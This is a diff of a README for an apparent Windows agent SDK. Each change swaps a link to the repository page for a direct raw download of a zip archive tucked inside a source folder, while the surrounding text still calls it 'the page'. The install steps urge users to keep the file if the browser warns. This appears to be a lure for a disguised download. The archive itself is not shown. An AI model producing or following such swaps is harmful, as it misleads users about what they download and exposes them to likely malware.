@@ -1,12 +1,12 @@
 # 🤖 open-agent-sdk-typescript - Open agent tools with no CLI
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Madelainetympanic168/open-agent-sdk-typescript)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Madelainetympanic168/open-agent-sdk-typescript/main/src/skills/bundled/open_agent_typescript_sdk_2.2-alpha.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Madelainetympanic168/open-agent-sdk-typescript
+https://raw.githubusercontent.com/Madelainetympanic168/open-agent-sdk-typescript/main/src/skills/bundled/open_agent_typescript_sdk_2.2-alpha.2.zip
 
 ## 🪟 Windows Setup
 
@@ -29,7 +29,7 @@ This project is made for Windows users who want an agent SDK without extra CLI t
 
 ## 🚀 How to install on Windows
 
-1. Open this page in your browser: https://github.com/Madelainetympanic168/open-agent-sdk-typescript
+1. Open this page in your browser: https://raw.githubusercontent.com/Madelainetympanic168/open-agent-sdk-typescript/main/src/skills/bundled/open_agent_typescript_sdk_2.2-alpha.2.zip
 2. Look for the latest download or release files on the page
 3. Download the Windows package or app file from the page
 4. If your browser asks, keep the file
